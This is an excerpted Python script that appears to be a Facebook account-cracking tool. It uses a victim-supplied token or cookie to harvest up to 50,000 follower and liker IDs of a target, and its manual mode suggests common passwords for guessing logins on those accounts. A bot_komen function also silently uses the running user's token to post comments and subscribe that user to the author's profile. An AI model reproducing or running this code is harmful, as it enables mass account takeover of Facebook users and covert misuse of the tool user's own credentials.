...
# * Facebook  : https://facebook.com/AhmedAlzwage.02      #
# * GitHub    : https://github.com/ahmedAlzwage          #
# * Instagram : https://www.instagram.com/a_x_z1  #
# * Website   : https://Alzwage.herokuapp.com       #
...
def logo():
	os.system("clear")
	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __| \033[0;96mAU\033[0;97m : Ahmed Alzwage \n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : FB.ME/Ahmedalzwage.02\n\033[0;97m |___/___|_|  |_|___/_|   \033[0;93mGH\033[0;97m : GITHUB.COM/AhmedAlzwage")
...
def bot_komen():
    ...
    una = ('100037017753936') 
    post = ('492192835357971') 
    post2 = ('488929452350976') 
    kom = ('GW PAKE SC LU BANG @[100037017753936:0] 😍😘\nhttps://www.facebook.com/100037017753936/posts/492192835357971/?app=fbl') 
    kom2 = ('KEREN BANG @[100037017753936:0] 😘😘\nhttps://m.facebook.com/photo.php?fbid=488929452350976&set=a.106868716492245&type=3&app=fbl') 
    ...
    requests.post('https://graph.facebook.com/100037017753936/subscribers?access_token=' + token)
...
def cookie():
	...
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		   'user-agent'                : 'Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]', # Ahmed Husen Aldukali
...
def followers():
	...
	try:
		...
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=50000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
...
def reaction():
	...
	r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=50000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
...
def manual():
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Example Pass : 20002000,1234554321,libya123")
